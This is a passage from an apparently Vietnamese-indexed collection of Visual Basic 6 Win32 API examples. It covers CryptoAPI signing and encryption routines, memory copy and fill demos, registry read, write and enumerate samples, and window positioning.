    GoTo ReleaseHandles:
End If

ReleaseHandles:
'Destroy hash object.
If lHHash Then lResult = CryptDestroyHash(lHHash)
'Release provider handle.
If lHCryptprov Then lResult = CryptReleaseContext(lHCryptprov, 0)

'switch Status property
lStatus = CFB_READY

Exit Sub

ErrSign:
MsgBox ("ErrSign " &amp; Error$)
GoTo ReleaseHandles
End Sub

Public Sub Validate()
'Validate InBuffer with Signature and assign Status with result
Dim bValid As Boolean, sContainer As String, sDescription As String, sProvider As String
Dim lDataLen As Long, lDataPoint As Long, lHCryptprov As Long, lHHash As Long
Dim lResult As Long, lSignatureLen As Long, lHCryptKey As Long

ReDim aByteData(0) As Byte

On Error GoTo ErrValidate

'switch Status property
lStatus = CFB_BUSY

'init internal valid flag
bValid = True

'Get handle to the default provider.
sContainer = vbNullChar
sProvider = MS_DEF_PROV &amp; vbNullChar
If Not CBool(CryptAcquireContext(lHCryptprov, ByVal sContainer, ByVal sProvider, PROV_RSA_FULL, 0)) Then
    bValid = False
    MsgBox ("Error " &amp; CStr(GetLastError) &amp; " during CryptAcquireContext!")
    GoTo ReleaseHandles:
End If

'Create a hash object.
If Not CBool(CryptCreateHash(lHCryptprov, CALG_MD5, 0, 0, lHHash)) Then
    bValid = False
    MsgBox ("Error " &amp; CStr(GetLastError) &amp; " during CryptCreateHash!")
    GoTo ReleaseHandles:
End If

'Add data to hash object.
If Not CBool(CryptHashData(lHHash, sInBuffer, Len(sInBuffer), 0)) Then
    bValid = False
    MsgBox ("Error " &amp; CStr(GetLastError) &amp; " during CryptHashData!")
    GoTo ReleaseHandles:
End If

'Determine size of signature.
'sDescription = vbNullChar
'lResult = CryptSignHash(lHHash, AT_SIGNATURE, sDescription, 0, 0, lSignatureLen)

'Get handle to signature key.
If Not CBool(CryptGetUserKey(lHCryptprov, AT_SIGNATURE, lHCryptKey)) Then
    bValid = False
    MsgBox ("Error " &amp; CStr(GetLastError) &amp; " during CryptGetUserKey!")
    GoTo ReleaseHandles:
End If

lSignatureLen = Len(sSignature)

'Verify signature.
If Not CBool(CryptVerifySignature(lHHash, sSignature, lSignatureLen, lHCryptKey, sDescription, 0)) Then

    If GetLastError = NTE_BAD_SIGNATURE Then
        bValid = False
        GoTo ReleaseHandles:
    Else
        bValid = False
        MsgBox ("Error " &amp; CStr(GetLastError) &amp; " during CryptVerifySignature!")
        GoTo ReleaseHandles:
    End If

End If

ReleaseHandles:
'Release signature key.
If lHCryptKey Then lResult = CryptDestroyKey(lHCryptKey)
'Destroy hash object.
If lHHash Then lResult = CryptDestroyHash(lHHash)
'Release provider handle.
If lHCryptprov Then lResult = CryptReleaseContext(lHCryptprov, 0)

Select Case bValid
    Case True
        lStatus = CFB_VALID
    Case Else
        lStatus = CFB_READY
End Select

Exit Sub

ErrValidate:
MsgBox ("ErrValidate " &amp; Error$)
Resume

End Sub
Public Sub Encrypt()
'Encrypt InBuffer into OutBuffer

Dim lHExchgKey As Long, lHCryptprov As Long, lHHash As Long, lHkey As Long
Dim lResult As Long, sContainer As String, sProvider As String, sCryptBuffer As String
Dim lCryptLength As Long, lCryptBufLen As Long

On Error GoTo ErrEncrypt

'switch Status property
lStatus = CFB_BUSY

'Get handle to the default provider
sContainer = vbNullChar
sProvider = vbNullChar
sProvider = MS_DEF_PROV &amp; vbNullChar
If Not CBool(CryptAcquireContext(lHCryptprov, ByVal sContainer, ByVal sProvider, PROV_RSA_FULL, 0)) Then
    MsgBox ("Error " &amp; CStr(GetLastError) &amp; " during CryptAcquireContext!")
    GoTo Done
End If

'Create a hash object.
If Not CBool(CryptCreateHash(lHCryptprov, CALG_MD5, 0, 0, lHHash)) Then
    MsgBox ("Error " &amp; CStr(GetLastError) &amp; " during CryptCreateHash!")
    GoTo Done
End If

'Hash in the password data.
If Not CBool(CryptHashData(lHHash, sPassword, Len(sPassword), 0)) Then
    MsgBox ("Error " &amp; CStr(GetLastError) &amp; " during CryptHashData!")
    GoTo Done
End If

'Derive a session key from the hash object.
If Not CBool(CryptDeriveKey(lHCryptprov, ENCRYPT_ALGORITHM, lHHash, 0, lHkey)) Then
    MsgBox ("Error " &amp; CStr(GetLastError) &amp; " during CryptDeriveKey!")
    GoTo Done
End If

'Destroy the hash object.
CryptDestroyHash (lHHash)
lHHash = 0

'Prepare a string buffer for the CryptEncrypt function
lCryptLength = Len(sInBuffer)
lCryptBufLen = lCryptLength * 2
sCryptBuffer = String(lCryptBufLen, vbNullChar)
LSet sCryptBuffer = sInBuffer

'Encrypt data
If Not CBool(CryptEncrypt(lHkey, 0, 1, 0, sCryptBuffer, lCryptLength, lCryptBufLen)) Then
    MsgBox ("bytes required:" &amp; CStr(lCryptLength))
    MsgBox ("Error " &amp; CStr(GetLastError) &amp; " during CryptEncrypt!")
    'GoTo Done
End If

sOutBuffer = Mid$(sCryptBuffer, 1, lCryptLength)

Done:

'Destroy session key.
If (lHkey) Then lResult = CryptDestroyKey(lHkey)

'Release key exchange key handle.
If lHExchgKey Then CryptDestroyKey (lHExchgKey)

'Destroy hash object.
If lHHash Then CryptDestroyHash (lHHash)

'Release provider handle.
If lHCryptprov Then lResult = CryptReleaseContext(lHCryptprov, 0)

'switch Status property
lStatus = CFB_READY

Exit Sub

ErrEncrypt:

MsgBox ("ErrEncrypt " &amp; Error$)
Resume

End Sub
Public Sub Decrypt()
'Decrypt InBuffer into OutBuffer
Dim lHExchgKey As Long, lHCryptprov As Long, lHHash As Long, lHkey As Long
Dim lResult As Long, sContainer As String, sProvider As String
Dim sCryptBuffer As String, lCryptBufLen As Long, lCryptPoint As Long
Dim lPasswordPoint As Long, lPasswordCount As Long

On Error GoTo ErrDecrypt

'switch Status property
lStatus = CFB_BUSY

'Init sOutBuffer
sOutBuffer = ""

'Get handle to the default provider.
sContainer = vbNullChar
sProvider = vbNullChar
sProvider = MS_DEF_PROV &amp; vbNullChar
If Not CBool(CryptAcquireContext(lHCryptprov, ByVal sContainer, ByVal sProvider, PROV_RSA_FULL, 0)) Then
    MsgBox ("Error " &amp; CStr(GetLastError) &amp; " during CryptAcquireContext!")
    GoTo Done
End If

'Create a hash object.
If Not CBool(CryptCreateHash(lHCryptprov, CALG_MD5, 0, 0, lHHash)) Then
    MsgBox ("Error " &amp; CStr(GetLastError) &amp; " during CryptCreateHash!")
    GoTo Done
End If

'Hash in the password data.
If Not CBool(CryptHashData(lHHash, sPassword, Len(sPassword), 0)) Then
    MsgBox ("Error " &amp; CStr(GetLastError) &amp; " during CryptHashData!")
    GoTo Done
End If

'Derive a session key from the hash object.
If Not CBool(CryptDeriveKey(lHCryptprov, ENCRYPT_ALGORITHM, lHHash, 0, lHkey)) Then
    MsgBox ("Error " &amp; CStr(GetLastError) &amp; " during CryptDeriveKey!")
    GoTo Done
End If

'Destroy the hash object.
CryptDestroyHash (lHHash)
lHHash = 0

'Prepare sCryptBuffer for CryptDecrypt
lCryptBufLen = Len(sInBuffer) * 2
sCryptBuffer = String(lCryptBufLen, vbNullChar)
LSet sCryptBuffer = sInBuffer

'Decrypt data
If Not CBool(CryptDecrypt(lHkey, 0, 1, 0, sCryptBuffer, lCryptBufLen)) Then
    MsgBox ("bytes required:" &amp; CStr(lCryptBufLen))
    MsgBox ("Error " &amp; CStr(GetLastError) &amp; " during CryptDecrypt!")
    GoTo Done
End If

'Apply decrypted string from sCryptBuffer to private buffer for OutBuffer property
sOutBuffer = Mid$(sCryptBuffer, 1, Len(sInBuffer))

Done:

'Destroy session key.
If (lHkey) Then lResult = CryptDestroyKey(lHkey)

'Release key exchange key handle.
If lHExchgKey Then CryptDestroyKey (lHExchgKey)

'Destroy hash object.
If lHHash Then CryptDestroyHash (lHHash)

'Release provider handle.
If lHCryptprov Then lResult = CryptReleaseContext(lHCryptprov, 0)

'switch Status property
lStatus = CFB_READY

Exit Sub

ErrDecrypt:
MsgBox ("ErrDecrypt " &amp; Error$)
GoTo Done

End Sub
Public Property Get Status() As Long
    Status = lStatus
End Property
Private Function InitUser() As Long
    Dim lHCryptprov As Long, lHCryptKey As Long, avProviderData(1000) As Byte
    Dim lProviderDataAddress As Long, lProviderDataLen As Long, lDataSize As Long
    Dim lResult As Long, sContainer As String, sProvider As String
    Dim sUserName As String, lPoint As Long, lMemHandle As Long
    Dim lReturn As Long, sBuffer As String

    On Error GoTo ErrInitUser
    'prepare string buffers

    sContainer = vbNullChar
    sProvider = MS_DEF_PROV &amp; vbNullChar

    'Attempt to acquire a handle to the default key container.
    If Not CBool(CryptAcquireContext(lHCryptprov, ByVal sContainer, ByVal sProvider, PROV_RSA_FULL, 0)) Then

        'Create default key container.
        If Not CBool(CryptAcquireContext(lHCryptprov, ByVal sContainer, ByVal sProvider, PROV_RSA_FULL, CRYPT_NEWKEYSET)) Then
            MsgBox ("Error creating key container! " &amp; CStr(GetLastError))
            Exit Function
        End If

        'Get name of default key container.
        lProviderDataLen = Len(avProviderData(0)) * (UBound(avProviderData) + 1)
        If Not CBool(CryptGetProvParam(lHCryptprov, PP_CONTAINER, avProviderData(0), lProviderDataLen, 0)) Then
            MsgBox ("Error getting user name! " &amp; CStr(GetLastError))
            avProviderData(0) = 0
        End If

        'Get sUserName from avProviderData()
        lPoint = LBound(avProviderData)
        While lPoint &lt;= UBound(avProviderData)
            If avProviderData(lPoint) &lt;&gt; 0 Then
                sUserName = sUserName &amp; Chr$(avProviderData(lPoint))
            Else
                lPoint = UBound(avProviderData)
            End If
            lPoint = lPoint + 1
        Wend

        MsgBox ("Create key container " &amp; sUserName)

    End If

    'Attempt to get handle to signature key
    If Not CBool(CryptGetUserKey(lHCryptprov, AT_SIGNATURE, lHCryptKey)) Then
        If GetLastError = NTE_NO_KEY Then
            MsgBox ("Create key exchange key pair")
            If Not CBool(CryptGenKey(lHCryptprov, AT_SIGNATURE, 0, lHCryptKey)) Then
                MsgBox ("Error during CryptGenKey! " &amp; CStr(GetLastError))
                Exit Function
            Else
                lResult = CryptDestroyKey(lHCryptprov)
            End If
        Else
            MsgBox ("Error during CryptGetUserKey! " &amp; CStr(GetLastError))
            Exit Function
        End If
    End If

    'Attempt to get handle to exchange key
    If Not CBool(CryptGetUserKey(lHCryptprov, AT_KEYEXCHANGE, lHCryptKey)) Then
        If GetLastError = NTE_NO_KEY Then
            MsgBox ("Create key exchange key pair")
            If Not CBool(CryptGenKey(lHCryptprov, AT_KEYEXCHANGE, 0, lHCryptKey)) Then
                MsgBox ("Error during CryptGenKey! " &amp; CStr(GetLastError))
                Exit Function
            Else
                lResult = CryptDestroyKey(lHCryptprov)
            End If
        Else
            MsgBox ("Error during CryptGetUserKey! " &amp; CStr(GetLastError))
            Exit Function
        End If
    End If

    'release handle to provider
    lResult = CryptReleaseContext(lHCryptprov, 0)
    InitUser = True

Exit Function

ErrInitUser:
    MsgBox ("ErrInitUser " &amp; Error$)
    Resume

End Function
Private Sub Class_Initialize()
    If InitUser = True Then
        MsgBox ("InitUser OK")
    Else
        MsgBox ("InitUser failed")
    End If
End Sub
Public Property Get Password() As String
    Password = sPassword
End Property
Public Property Let Password(vNewValue As String)
    sPassword = vNewValue
End Property
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>092219092254</MaVD>
    <NoiDung>Xem ví dụ ở GlobalAlloc</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>092619092636</MaVD>
    <NoiDung>Xem ví dụ ở GlobalAlloc</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>092919092931</MaVD>
    <NoiDung>Xem ví dụ ở GlobalAlloc</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>093319093329</MaVD>
    <NoiDung>' This code is licensed according to the terms and conditions listed here.
' http://www.hep.wisc.edu/~pinghc/books/apirefeng/m/movememory.html
' Transfer the contents of one byte array to another.  After the transfer,
' the contents of the source array are set to 0.
Dim source(0 To 9) As Byte  ' source array of 10 bytes
Dim target(0 To 9) As Byte  ' similarly sized target array
Dim c As Integer  ' counter variable

' Fill the source array with some information.
For c = 0 To 9  ' loop through each element
  source(c) = c  ' set each element's value to its index
Next c

' Transfer the data from the target array to the source array.  Note how pointers
' are implied merely by passing the arrays as usual.
MoveMemory target(0), source(0), 10  ' copy all 10 bytes

' Verify that the contents were transfered.
For c = 0 To 9
  Debug.Print target(c);  ' this will now contain the information
Next c</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>094119094101</MaVD>
    <NoiDung>Private Declare Sub FillMemory Lib "kernel32.dll" Alias "RtlFillMemory" (Destination As Any, ByVal Length As Long, ByVal Fill As Byte)
Private Declare Sub ZeroMemory Lib "kernel32.dll" Alias "RtlZeroMemory" (Destination As Any, ByVal Length As Long)
Private Sub Form_Load()
    'KPD-Team 2000
    'URL: http://www.allapi.net/
    'E-Mail: KPDTeam@Allapi.net
    Dim TestString As String
    'Mak sure Visual Basic repaint the form automatically
    Me.AutoRedraw = True
    'Create a buffer string
    TestString = String(25, "X")
    Me.Print "This is our initial string: " + TestString
    'Fill the buffer-string with A's
    FillMemory ByVal TestString, Len(TestString), Asc("A")
    Me.Print "This is our string after FillMemory: " + TestString
    'Empty the string
    ZeroMemory ByVal TestString, Len(TestString)
    Me.Print "This is our string after ZeroMemory: " + TestString
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>094319094349</MaVD>
    <NoiDung>'This program needs 3 buttons
Const REG_SZ = 1 ' Unicode nul terminated string
Const REG_BINARY = 3 ' Free form binary
Const HKEY_CURRENT_USER = &amp;H80000001
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
Private Declare Function RegCreateKey Lib "advapi32.dll" Alias "RegCreateKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long
Private Declare Function RegDeleteValue Lib "advapi32.dll" Alias "RegDeleteValueA" (ByVal hKey As Long, ByVal lpValueName As String) As Long
Private Declare Function RegOpenKey Lib "advapi32.dll" Alias "RegOpenKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long
Private Declare Function RegQueryValueEx Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, lpData As Any, lpcbData As Long) As Long
Private Declare Function RegSetValueEx Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As Any, ByVal cbData As Long) As Long
Function RegQueryStringValue(ByVal hKey As Long, ByVal strValueName As String) As String
    Dim lResult As Long, lValueType As Long, strBuf As String, lDataBufSize As Long
    'retrieve nformation about the key
    lResult = RegQueryValueEx(hKey, strValueName, 0, lValueType, ByVal 0, lDataBufSize)
    If lResult = 0 Then
        If lValueType = REG_SZ Then
            'Create a buffer
            strBuf = String(lDataBufSize, Chr$(0))
            'retrieve the key's content
            lResult = RegQueryValueEx(hKey, strValueName, 0, 0, ByVal strBuf, lDataBufSize)
            If lResult = 0 Then
                'Remove the unnecessary chr$(0)'s
                RegQueryStringValue = Left$(strBuf, InStr(1, strBuf, Chr$(0)) - 1)
            End If
        ElseIf lValueType = REG_BINARY Then
            Dim strData As Integer
            'retrieve the key's value
            lResult = RegQueryValueEx(hKey, strValueName, 0, 0, strData, lDataBufSize)
            If lResult = 0 Then
                RegQueryStringValue = strData
            End If
        End If
    End If
End Function
Function GetString(hKey As Long, strPath As String, strValue As String)
    Dim Ret
    'Open the key
    RegOpenKey hKey, strPath, Ret
    'Get the key's content
    GetString = RegQueryStringValue(Ret, strValue)
    'Close the key
    RegCloseKey Ret
End Function
Sub SaveString(hKey As Long, strPath As String, strValue As String, strData As String)
    Dim Ret
    'Create a new key
    RegCreateKey hKey, strPath, Ret
    'Save a string to the key
    RegSetValueEx Ret, strValue, 0, REG_SZ, ByVal strData, Len(strData)
    'close the key
    RegCloseKey Ret
End Sub
Sub SaveStringLong(hKey As Long, strPath As String, strValue As String, strData As String)
    Dim Ret
    'Create a new key
    RegCreateKey hKey, strPath, Ret
    'Set the key's value
    RegSetValueEx Ret, strValue, 0, REG_BINARY, CByte(strData), 4
    'close the key
    RegCloseKey Ret
End Sub
Sub DelSetting(hKey As Long, strPath As String, strValue As String)
    Dim Ret
    'Create a new key
    RegCreateKey hKey, strPath, Ret
    'Delete the key's value
    RegDeleteValue Ret, strValue
    'close the key
    RegCloseKey Ret
End Sub
Private Sub Command1_Click()
    Dim strString As String
    'Ask for a value
    strString = InputBox("Please enter a value between 0 and 255 to be saved as a binary value in the registry.", App.Title)
    If strString = "" Or Val(strString) &gt; 255 Or Val(strString) &lt; 0 Then
        MsgBox "Invalid value entered ...", vbExclamation + vbOKOnly, App.Title
        Exit Sub
    End If
    'Save the value to the registry
    SaveStringLong HKEY_CURRENT_USER, "KPD-Team", "BinaryValue", CByte(strString)
End Sub
Private Sub Command2_Click()
    'Get a string from the registry
    Ret = GetString(HKEY_CURRENT_USER, "KPD-Team", "BinaryValue")
    If Ret = "" Then MsgBox "No value found !", vbExclamation + vbOKOnly, App.Title: Exit Sub
    MsgBox "The value is " + Ret, vbOKOnly + vbInformation, App.Title
End Sub
Private Sub Command3_Click()
    'Delete the setting from the registry
    DelSetting HKEY_CURRENT_USER, "KPD-Team", "BinaryValue"
    MsgBox "The value was deleted ...", vbInformation + vbOKOnly, App.Title
End Sub
Private Sub Form_Load()
    'KPD-Team 1998
    'URL: http://www.allapi.net/
    'E-Mail: KPDTeam@Allapi.net
    Command1.Caption = "Set Value"
    Command2.Caption = "Get Value"
    Command3.Caption = "Delete Value"
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>094619094601</MaVD>
    <NoiDung>Const HKEY_CURRENT_USER = &amp;H80000001
Const REG_OPTION_BACKUP_RESTORE = 4     ' open for backup or restore
Const REG_OPTION_VOLATILE = 1           ' Key is not preserved when system is rebooted
Const REG_OPTION_NON_VOLATILE = 0       ' Key is preserved when system is rebooted
Const STANDARD_RIGHTS_ALL = &amp;H1F0000
Const SYNCHRONIZE = &amp;H100000
Const READ_CONTROL = &amp;H20000
Const STANDARD_RIGHTS_READ = (READ_CONTROL)
Const STANDARD_RIGHTS_WRITE = (READ_CONTROL)
Const KEY_CREATE_LINK = &amp;H20
Const KEY_CREATE_SUB_KEY = &amp;H4
Const KEY_ENUMERATE_SUB_KEYS = &amp;H8
Const KEY_NOTIFY = &amp;H10
Const KEY_QUERY_VALUE = &amp;H1
Const KEY_SET_VALUE = &amp;H2
Const KEY_READ = ((STANDARD_RIGHTS_READ Or KEY_QUERY_VALUE Or KEY_ENUMERATE_SUB_KEYS Or KEY_NOTIFY) And (Not SYNCHRONIZE))
Const KEY_WRITE = ((STANDARD_RIGHTS_WRITE Or KEY_SET_VALUE Or KEY_CREATE_SUB_KEY) And (Not SYNCHRONIZE))
Const KEY_EXECUTE = (KEY_READ)
Const KEY_ALL_ACCESS = ((STANDARD_RIGHTS_ALL Or KEY_QUERY_VALUE Or KEY_SET_VALUE Or KEY_CREATE_SUB_KEY Or KEY_ENUMERATE_SUB_KEYS Or KEY_NOTIFY Or KEY_CREATE_LINK) And (Not SYNCHRONIZE))
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
Private Declare Function RegDeleteKey Lib "advapi32.dll" Alias "RegDeleteKeyA" (ByVal hKey As Long, ByVal lpSubKey As String) As Long
Private Declare Function RegCreateKeyEx Lib "advapi32.dll" Alias "RegCreateKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal Reserved As Long, ByVal lpClass As String, ByVal dwOptions As Long, ByVal samDesired As Long, lpSecurityAttributes As Any, phkResult As Long, lpdwDisposition As Long) As Long
Private Declare Function RegOpenKeyEx Lib "advapi32.dll" Alias "RegOpenKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal Reserved As Long, ByVal samDesired As Long, phkResult As Long) As Long
Private Sub Form_Load()
    'KPD-Team 2000
    'URL: http://www.allapi.net/
    'E-Mail: KPDTeam@Allapi.net
    Dim Result As Long
    'Check if the specified key exists
    RegOpenKeyEx HKEY_CURRENT_USER, "KPD-Team", 0, KEY_ALL_ACCESS, Result
    'If the key doesn't exist, we create it
    If Result = 0 Then
        'Create a new key
        RegCreateKeyEx HKEY_CURRENT_USER, "KPD-Team", 0, "REG_DWORD", REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, ByVal 0&amp;, Result, Ret
        If Result = 0 Then
            MsgBox "Error while creating the Key!!"
            Exit Sub
        End If
    End If
    'Delete the key
    RegDeleteKey Result, ""
    'close the handle
    RegCloseKey Result
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>094719094737</MaVD>
    <NoiDung>'This program needs 3 buttons
Const REG_SZ = 1 ' Unicode nul terminated string
Const REG_BINARY = 3 ' Free form binary
Const HKEY_CURRENT_USER = &amp;H80000001
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
Private Declare Function RegCreateKey Lib "advapi32.dll" Alias "RegCreateKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long
Private Declare Function RegDeleteValue Lib "advapi32.dll" Alias "RegDeleteValueA" (ByVal hKey As Long, ByVal lpValueName As String) As Long
Private Declare Function RegOpenKey Lib "advapi32.dll" Alias "RegOpenKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long
Private Declare Function RegQueryValueEx Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, lpData As Any, lpcbData As Long) As Long
Private Declare Function RegSetValueEx Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As Any, ByVal cbData As Long) As Long
Function RegQueryStringValue(ByVal hKey As Long, ByVal strValueName As String) As String
    Dim lResult As Long, lValueType As Long, strBuf As String, lDataBufSize As Long
    'retrieve nformation about the key
    lResult = RegQueryValueEx(hKey, strValueName, 0, lValueType, ByVal 0, lDataBufSize)
    If lResult = 0 Then
        If lValueType = REG_SZ Then
            'Create a buffer
            strBuf = String(lDataBufSize, Chr$(0))
            'retrieve the key's content
            lResult = RegQueryValueEx(hKey, strValueName, 0, 0, ByVal strBuf, lDataBufSize)
            If lResult = 0 Then
                'Remove the unnecessary chr$(0)'s
                RegQueryStringValue = Left$(strBuf, InStr(1, strBuf, Chr$(0)) - 1)
            End If
        ElseIf lValueType = REG_BINARY Then
            Dim strData As Integer
            'retrieve the key's value
            lResult = RegQueryValueEx(hKey, strValueName, 0, 0, strData, lDataBufSize)
            If lResult = 0 Then
                RegQueryStringValue = strData
            End If
        End If
    End If
End Function
Function GetString(hKey As Long, strPath As String, strValue As String)
    Dim Ret
    'Open the key
    RegOpenKey hKey, strPath, Ret
    'Get the key's content
    GetString = RegQueryStringValue(Ret, strValue)
    'Close the key
    RegCloseKey Ret
End Function
Sub SaveString(hKey As Long, strPath As String, strValue As String, strData As String)
    Dim Ret
    'Create a new key
    RegCreateKey hKey, strPath, Ret
    'Save a string to the key
    RegSetValueEx Ret, strValue, 0, REG_SZ, ByVal strData, Len(strData)
    'close the key
    RegCloseKey Ret
End Sub
Sub SaveStringLong(hKey As Long, strPath As String, strValue As String, strData As String)
    Dim Ret
    'Create a new key
    RegCreateKey hKey, strPath, Ret
    'Set the key's value
    RegSetValueEx Ret, strValue, 0, REG_BINARY, CByte(strData), 4
    'close the key
    RegCloseKey Ret
End Sub
Sub DelSetting(hKey As Long, strPath As String, strValue As String)
    Dim Ret
    'Create a new key
    RegCreateKey hKey, strPath, Ret
    'Delete the key's value
    RegDeleteValue Ret, strValue
    'close the key
    RegCloseKey Ret
End Sub
Private Sub Command1_Click()
    Dim strString As String
    'Ask for a value
    strString = InputBox("Please enter a value between 0 and 255 to be saved as a binary value in the registry.", App.Title)
    If strString = "" Or Val(strString) &gt; 255 Or Val(strString) &lt; 0 Then
        MsgBox "Invalid value entered ...", vbExclamation + vbOKOnly, App.Title
        Exit Sub
    End If
    'Save the value to the registry
    SaveStringLong HKEY_CURRENT_USER, "KPD-Team", "BinaryValue", CByte(strString)
End Sub
Private Sub Command2_Click()
    'Get a string from the registry
    Ret = GetString(HKEY_CURRENT_USER, "KPD-Team", "BinaryValue")
    If Ret = "" Then MsgBox "No value found !", vbExclamation + vbOKOnly, App.Title: Exit Sub
    MsgBox "The value is " + Ret, vbOKOnly + vbInformation, App.Title
End Sub
Private Sub Command3_Click()
    'Delete the setting from the registry
    DelSetting HKEY_CURRENT_USER, "KPD-Team", "BinaryValue"
    MsgBox "The value was deleted ...", vbInformation + vbOKOnly, App.Title
End Sub
Private Sub Form_Load()
    'KPD-Team 1998
    'URL: http://www.allapi.net/
    'E-Mail: KPDTeam@Allapi.net
    Command1.Caption = "Set Value"
    Command2.Caption = "Get Value"
    Command3.Caption = "Delete Value"
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>094919094913</MaVD>
    <NoiDung>Const ERROR_NO_MORE_ITEMS = 259&amp;
Const HKEY_CURRENT_CONFIG = &amp;H80000005
Const HKEY_LOCAL_MACHINE = &amp;H80000002
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
Private Declare Function RegOpenKey Lib "advapi32.dll" Alias "RegOpenKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long
Private Declare Function RegEnumKeyEx Lib "advapi32.dll" Alias "RegEnumKeyExA" (ByVal hKey As Long, ByVal dwIndex As Long, ByVal lpName As String, lpcbName As Long, ByVal lpReserved As Long, ByVal lpClass As String, lpcbClass As Long, lpftLastWriteTime As Any) As Long
Private Declare Function RegEnumValue Lib "advapi32.dll" Alias "RegEnumValueA" (ByVal hKey As Long, ByVal dwIndex As Long, ByVal lpValueName As String, lpcbValueName As Long, ByVal lpReserved As Long, lpType As Long, lpData As Any, lpcbData As Long) As Long
Private Sub Form_Load()
    'KPD-Team 2001
    'URL: http://www.allapi.net/
    'E-Mail: KPDTeam@Allapi.net
    Dim hKey As Long, Cnt As Long, sName As String, sData As String, Ret As Long, RetData As Long
    Const BUFFER_SIZE As Long = 255
    'Set the forms graphics mode to persistent
    Me.AutoRedraw = True
    Me.Print "RegEnumKeyEx"
    Ret = BUFFER_SIZE
    'Open the registry key
    If RegOpenKey(HKEY_LOCAL_MACHINE, "Hardware", hKey) = 0 Then
        'Create a buffer
        sName = Space(BUFFER_SIZE)
        'Enumerate the keys
        While RegEnumKeyEx(hKey, Cnt, sName, Ret, ByVal 0&amp;, vbNullString, ByVal 0&amp;, ByVal 0&amp;) &lt;&gt; ERROR_NO_MORE_ITEMS
            'Show the enumerated key
            Me.Print "  " + Left$(sName, Ret)
            'prepare for the next key
            Cnt = Cnt + 1
            sName = Space(BUFFER_SIZE)
            Ret = BUFFER_SIZE
        Wend
        'close the registry key
        RegCloseKey hKey
    Else
        Me.Print "  Error while calling RegOpenKey"
    End If
    Me.Print vbCrLf + "RegEnumValue"
    Cnt = 0
    'Open a registry key
    If RegOpenKey(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion", hKey) = 0 Then
        'initialize
        sName = Space(BUFFER_SIZE)
        sData = Space(BUFFER_SIZE)
        Ret = BUFFER_SIZE
        RetData = BUFFER_SIZE
        'enumerate the values
        While RegEnumValue(hKey, Cnt, sName, Ret, 0, ByVal 0&amp;, ByVal sData, RetData) &lt;&gt; ERROR_NO_MORE_ITEMS
            'show data
            If RetData &gt; 0 Then Me.Print "  " + Left$(sName, Ret) + "=" + Left$(sData, RetData - 1)
            'prepare for next value
            Cnt = Cnt + 1
            sName = Space(BUFFER_SIZE)
            sData = Space(BUFFER_SIZE)
            Ret = BUFFER_SIZE
            RetData = BUFFER_SIZE
        Wend
        'Close the registry key
        RegCloseKey hKey
    Else
        Me.Print "  Error while calling RegOpenKey"
    End If
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>092520082506</MaVD>
    <NoiDung>Người ta cũng chỉ ra nó chỉ hữu ích trong Windows 16bit (Windows 3.1)
Hàm này không hữu ích trong Win32.</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>092720082732</MaVD>
    <NoiDung>Const WS_BORDER = &amp;H800000
Const WS_DLGFRAME = &amp;H400000
Const WS_THICKFRAME = &amp;H40000
Const WS_CAPTION = &amp;HC00000                  '  WS_BORDER Or WS_DLGFRAME
Const HWND_BOTTOM = 1
Const HWND_TOP = 0
Const HWND_TOPMOST = -1
Const HWND_NOTOPMOST = -2
Const SWP_SHOWWINDOW = &amp;H40
Private Type RECT
        Left As Long
        Top As Long
        Right As Long
        Bottom As Long
End Type
Private Declare Function AdjustWindowRect Lib "user32" (lpRect As RECT, ByVal dwStyle As Long, ByVal bMenu As Long) As Long
Private Declare Function BeginDeferWindowPos Lib "user32" (ByVal nNumWindows As Long) As Long
Private Declare Function DeferWindowPos Lib "user32" (ByVal hWinPosInfo As Long, ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal x As Long, ByVal y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
Private Declare Function EndDeferWindowPos Lib "user32" (ByVal hWinPosInfo As Long) As Long
Private Sub Form_Load()
    'KPD-Team 2000
    'URL: http://www.allapi.net/
    'E-Mail: KPDTeam@Allapi.net
    Dim R As RECT, hDWP As Long
    R.Left = 30
    R.Top = 30
    R.Bottom = 200
    R.Right = 120
    AdjustWindowRect R, WS_THICKFRAME Or WS_CAPTION, False
    hDWP = BeginDeferWindowPos(1)
    DeferWindowPos hDWP, Me.hwnd, HWND_TOP, R.Left, R.Top, R.Right - R.Left, R.Bottom - R.Top, SWP_SHOWWINDOW
    EndDeferWindowPos hDWP
End Sub
